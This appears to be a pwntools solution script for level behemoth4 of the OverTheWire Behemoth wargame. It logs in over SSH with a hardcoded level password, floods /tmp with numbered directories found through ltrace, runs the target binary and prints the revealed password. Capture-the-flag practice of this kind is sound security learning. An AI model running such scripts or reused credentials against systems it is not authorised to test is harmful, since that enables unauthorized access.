from pwn import *


'''
local exploit:
    We have a binary that opens the file in /tmp folder and do something with it.
I just did the ltrace and then tried to create many files with number range from the ltrace output.
Next, I executed the binary and got the password
'''
con = ssh('behemoth4', 'behemoth.labs.overthewire.org', password='ietheishei', port=2221)
p = con.process('bash')
for i in range(1, 30000):
    p.sendline(f'mkdir /tmp/{i}')
p.close()
p = con.process('/behemoth/behemoth4')
print(p.recv())
